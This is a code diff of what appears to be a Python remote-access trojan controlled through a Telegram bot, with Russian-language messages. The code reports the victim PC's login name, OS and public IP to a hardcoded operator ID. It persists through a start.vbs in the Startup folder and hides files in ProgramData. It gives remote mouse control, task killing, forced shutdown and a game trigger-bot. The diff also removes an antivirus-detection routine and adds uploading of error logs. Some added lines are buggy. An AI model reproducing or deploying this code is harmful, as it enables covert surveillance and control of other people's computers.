@@ -42,7 +42,7 @@ bot = telebot.TeleBot(token)
 
 pyautogui.FAILSAFE=False
 
-adm = [6418378200]
+adm = [6790944789]
 state = 1
 
 menu = types.ReplyKeyboardMarkup()
@@ -222,73 +222,40 @@ closeme = types.InlineKeyboardMarkup()
 button1 = types.InlineKeyboardButton('✅', callback_data='closeme')
 closeme.row(button1)
 
-
-if os.path.exists('C:\\Program Files\\Windows Defender'):
-   av = 'Windows Defender'
-if os.path.exists('C:\\Program Files\\AVAST Software\\Avast'):
-   av = 'Avast'
-if os.path.exists('C:\\Program Files\\AVG\\Antivirus'):
-   av = 'AVG'
-if os.path.exists('C:\\Program Files\\Avira\\Launcher'):
-   av = 'Avira'
-if os.path.exists('C:\\Program Files\\IObit\\Advanced SystemCare'):
-   av = 'Advanced SystemCare'
-if os.path.exists('C:\\Program Files\\Bitdefender Antivirus Free'):
-   av = 'Bitdefender'
-if os.path.exists('C:\\Program Files\\COMODO\\COMODO Internet Security'):
-   av = 'Comodo'
-if os.path.exists('C:\\Program Files\\DrWeb'):
-   av = 'Dr.Web'
-if os.path.exists('C:\\Program Files\\ESET\\ESET Security'):
-   av = 'ESET'
-if os.path.exists('C:\\Program Files\\GRIZZLY Antivirus'):
-   av = 'Grizzly Pro'
-if os.path.exists('C:\\Program Files\\Kaspersky Lab'):
-   av = 'Kaspersky'
-if os.path.exists('C:\\Program Files\\IObit\\IObit Malware Fighter'):
-   av = 'Malware fighter'
-if os.path.exists('C:\\Program Files\\Norton Security'):
-   av = 'Norton'
-if os.path.exists('C:\\Program Files\\Panda Security\\Panda Security Protection'):
-   av = 'Panda Security'
-if os.path.exists('C:\\Program Files\\360\\Total Security'):
-   av = '360 Total Security'
-else:
-   pass
-
 try:
- r = requests.get('http://ip.42.pl/raw')
- IP = r.text
- for i in adm:
-     bot.send_message(i,
-     '\n🟢 Online!'
-     '\n' + '\nPC » ' + os.getlogin() +
-     '\nOS » ' + platform.system() + ' ' + platform.release() +
-     '\n'
-     '\nAV » ' + av +
-     '\n'
-     '\nIP » ' + IP,
-     reply_markup=menu)
- if os.path.exists('C:\\ProgramData\\Files'):
-   pass
- else:
-   os.makedirs('C:\\ProgramData\\Files')
-   os.makedirs('C:\\ProgramData\\Files\\Documents')
-   os.makedirs('C:\\ProgramData\\Files\\Photos')
+    try:
+        r = requests.get('https://ipinfo.io/json', verify = True)
+        IP = r.json()['ip']
+    except:
+        IP = "Не удалось получить информацию"
+    for i in adm:
+        bot.send_message(i,
+             '\n🟢 Online!'
+             '\n' + '\nPC » ' + os.getlogin() +
+             '\nOS » ' + platform.system() + ' ' + platform.release() +
+             '\n'
+             '\nIP » ' + IP,
+             reply_markup=menu)
+    if os.path.exists('C:\\ProgramData\\Files'):
+        pass
+    else:
+        os.makedirs('C:\\ProgramData\\Files')
+        os.makedirs('C:\\ProgramData\\Files\\Documents')
+        os.makedirs('C:\\ProgramData\\Files\\Photos')
 except:
- time.sleep(30)
- stoper = 0
- try:
-     os.startfile('C:\\ProgramData\\Files\\start.vbs')
- except:
-     try:
-         os.startfile(
-             'C:\\Users\\' + os.getlogin() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\start.vbs')
-     except:
-         stoper = 1
- if stoper == 0:
-     os.system('taskkill /f /im py.exe')
-     exit()
+    time.sleep(30)
+    stoper = 0
+    try:
+        os.startfile('C:\\ProgramData\\Files\\start.vbs')
+    except:
+        try:
+            os.startfile(
+                'C:\\Users\\' + os.getlogin() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\start.vbs')
+        except:
+            stoper = 1
+    if stoper == 0:
+        os.system('taskkill /f /im py.exe')
+        exit()
 
 try:
     py_win_keyboard_layout.change_foreground_window_keyboard_layout(0x04090409)
@@ -424,10 +391,15 @@ def screen(command):
             os.remove('C:\\ProgramData\\Screenshot.jpg')
         except Exception as e:
             try:
-                log = open("ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M'),"a")
+                log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt","a")
                 log.write(f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({command.chat.id}) {command.chat.username} Написал - {command.text}\n\nОшибка:\n{e}")
                 log.close()
-                bot.send_message(command.chat.id, str(e))
+                try:
+                    files = os.listdir("c:/ProgramData/Files/Documents/logs/")
+                    paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
+                    bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
+                except:
+                    pass
             except:
                 pass
 
@@ -1423,11 +1395,17 @@ def tasklist(command):
             tasklist.close()
             os.remove('C:\\ProgramData\\Tasklist.txt')
         except Exception as e:
-            log = open("ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M'),
+            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt",
                        "a")
             log.write(
                 f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({command.chat.id}) {command.chat.username} Написал - {command.text}\n\nОшибка:\n{e}")
             log.close()
+            try:
+                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
+                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
+                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
+            except:
+                pass
 
 @bot.message_handler(commands=['Taskkill', 'taskkill'])
 def taskkill(message):
@@ -1526,11 +1504,17 @@ def say(message):
             del speaker
             bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
         except Exception as e:
-            log = open("ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M'),
+            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt",
                        "a")
             log.write(
                 f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
             log.close()
+            try:
+                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
+                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
+                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
+            except:
+                pass
 
 @bot.message_handler(commands=['say'])
 def say(message):
@@ -1549,11 +1533,17 @@ def say(message):
             del speaker
             bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
         except Exception as e:
-            log = open("ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M'),
+            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt",
                        "a")
             log.write(
                 f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
             log.close()
+            try:
+                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
+                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
+                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
+            except:
+                pass
 
 
 @bot.message_handler(commands=['Mouse', 'mouse'])
@@ -1562,11 +1552,17 @@ def mouse(message):
         try:
             bot.send_message(message.chat.id, '. . .', parse_mode="Markdown", reply_markup=main15)
         except Exception as e:
-            log = open("ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M'),
+            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt",
                        "a")
             log.write(
                 f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
             log.close()
+            try:
+                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
+                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
+                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
+            except:
+                pass
 
 
 @bot.message_handler(commands=['LeftClick', 'leftclick', 'click', 'Click', 'lc'])
@@ -1576,9 +1572,15 @@ def leftclick(message):
             pyautogui.leftClick()
             bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
         except Exception as e:
-            log = open("ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M'),"a")
+            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt","a")
             log.write(f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
             log.close()
+            try:
+                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
+                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
+                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
+            except:
+                pass
 
 
 @bot.message_handler(commands=['RightClick', 'rightclick', 'rc'])
@@ -1588,9 +1590,15 @@ def rightclick(message):
             pyautogui.rightClick()
             bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
         except Exception as e:
-            log = open("ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M'),"a")
+            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt","a")
             log.write(f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
             log.close()
+            try:
+                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
+                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
+                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
+            except:
+                pass
 
 
 @bot.message_handler(commands=['LeftDoubleClick', 'leftdoubleclick', 'ldc'])
@@ -1600,9 +1608,15 @@ def leftdoubleclick(message):
             pyautogui.doubleClick(button="left")
             bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
         except Exception as e:
-            log = open("ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M'),"a")
+            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt","a")
             log.write(f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
             log.close()
+            try:
+                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
+                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
+                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
+            except:
+                pass
 
 
 @bot.message_handler(commands=['MiddleClick', 'middleclick', 'mc'])
@@ -1612,9 +1626,15 @@ def middleclick(message):
             pyautogui.middleClick()
             bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
         except Exception as e:
-            log = open("ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M'),"a")
+            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt","a")
             log.write(f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
             log.close()
+            try:
+                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
+                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
+                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
+            except:
+                pass
 
 
 @bot.message_handler(commands=['RightHold', 'righthold', 'rh'])
@@ -1626,9 +1646,15 @@ def righthold(message):
             pyautogui.mouseUp(button="right")
             bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
         except Exception as e:
-            log = open("ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M'),"a")
+            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt","a")
             log.write(f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
             log.close()
+            try:
+                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
+                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
+                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
+            except:
+                pass
 
 
 @bot.message_handler(commands=['AutoAcceptOn', 'autoaccepton', 'acon'])
@@ -1651,9 +1677,15 @@ def autoaccepton(message):
             threading.Thread(target=func, args=(message.chat.id,)).start()
             bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
         except Exception as e:
-            log = open("ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M'),"a")
+            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt","a")
             log.write(f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
             log.close()
+            try:
+                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
+                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
+                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
+            except:
+                pass
 
 
 @bot.message_handler(commands=['AutoAcceptOff', 'autoacceptoff', 'acoff'])
@@ -1664,25 +1696,37 @@ def autoaccepton(message):
             stopfunc = 1
             bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
         except Exception as e:
-            log = open("ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M'), "a")
+            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt", "a")
             log.write(f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
             log.close()
+            try:
+                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
+                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
+                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
+            except:
+                pass
 
 
 @bot.message_handler(commands=['MoveMouse', 'movemouse', 'mm'])
-def autoaccepton(message):
+def movemouse(message):
     if message.chat.id in adm:
         try:
             pyautogui.moveTo(x=int(message.text.split()[1]), y=int(message.text.split()[2]))
             bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
         except Exception as e:
             try:
-                log = open("ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M'),"a")
+                log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt" + ".txt","a")
                 log.write(
                     f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
                 log.close()
-            except:
-                pass
+                try:
+                    files = os.listdir("c:/ProgramData/Files/Documents/logs/")
+                    paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
+                    bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
+                except:
+                    pass
+            except Exception as e:
+                print(e)
 
 
 @bot.message_handler(commands=['Trigger', 'trigger', 'tr'])
@@ -1694,8 +1738,10 @@ def trigger(message):
             def tr(id):
                 global stoptr
                 pixel = pyautogui.pixel(pyautogui.position().x + 2, pyautogui.position().y + 2)
+                bot.send_message(id, pixel)
                 while stoptr == 0:
                     if pixel != pyautogui.pixel(pyautogui.position().x + 2, pyautogui.position().y + 2):
+                        bot.send_message(id, pyautogui.pixel(pyautogui.position().x + 2, pyautogui.position().y + 2))
                         leftClick()
                         bot.send_message(id, "Успешный выстрел")
                         stoptr = 1
@@ -1706,10 +1752,16 @@ def trigger(message):
             bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
         except Exception as e:
             try:
-                log = open("ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M'),"a")
+                log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt","a")
                 log.write(
                     f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
                 log.close()
+                try:
+                    files = os.listdir("c:/ProgramData/Files/Documents/logs/")
+                    paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
+                    bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
+                except:
+                    pass
             except:
                 pass
 
@@ -1722,9 +1774,99 @@ def triggeroff(message):
             stoptr = 1
             bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
         except Exception as e:
-            log = open("ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M'), "a")
+            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt", "a")
             log.write(f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
             log.close()
+            try:
+                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
+                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
+                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
+            except:
+                pass
+
+
+@bot.message_handler(commands=['poweroff', 'PowerOff', 'po'])
+def poweroff(message):
+    if message.chat.id in adm:
+        try:
+            message.answer(chat_id=message.chat.id, message_id=message.message_id,
+                                  text='*Компьютер выключен!*', parse_mode="Markdown")
+            os.system('shutdown -s /t 0 /f')
+        except Exception as e:
+            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(
+                pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt", "a")
+            log.write(
+                f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
+            log.close()
+            try:
+                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
+                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
+                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
+            except:
+                pass
+
+
+@bot.message_handler(commands=['powerofftime', 'PowerOffTime', 'pot'])
+def powerofftime(message):
+    if message.chat.id in adm:
+        try:
+            message.answer(chat_id=message.chat.id, message_id=message.message_id,
+                                  text='*Компьютер будет выключен через 5 минут!*', parse_mode="Markdown")
+            os.system('shutdown -s /t 300 /f')
+        except Exception as e:
+            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(
+                pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt", "a")
+            log.write(
+                f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
+            log.close()
+            try:
+                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
+                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
+                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
+            except:
+                pass
+
+
+@bot.message_handler(commands=['powerofftime', 'PowerOffTime', 'pot'])
+def powerofftime(message):
+    if message.chat.id in adm:
+        try:
+            message.answer(chat_id=message.chat.id, message_id=message.message_id,
+                                  text='*Компьютер будет выключен через 5 минут!*', parse_mode="Markdown")
+            os.system('shutdown -s /t 300 /f')
+        except Exception as e:
+            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(
+                pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt", "a")
+            log.write(
+                f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
+            log.close()
+            try:
+                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
+                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
+                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
+            except:
+                pass
+
+
+@bot.message_handler(commands=['getlastlogs', 'gll'])
+def getlastlogs(message):
+    if message.chat.id in adm:
+        try:
+            files = os.listdir("c:/ProgramData/Files/Documents/logs/")
+            paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
+            bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
+        except Exception as e:
+            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(
+                pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt", "a")
+            log.write(
+                f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
+            log.close()
+            try:
+                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
+                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
+                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
+            except:
+                pass
 
 try:
     bot.polling(none_stop=True)
@@ -1739,9 +1881,15 @@ except:
         except Exception as e:
             stoper = 1
             try:
-                log = open("ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M'),"a")
+                log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt","a")
                 log.write(f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
                 log.close()
+                try:
+                    files = os.listdir("c:/ProgramData/Files/Documents/logs/")
+                    paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
+                    bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
+                except:
+                    pass
             except:
                 pass
             time.sleep(10)
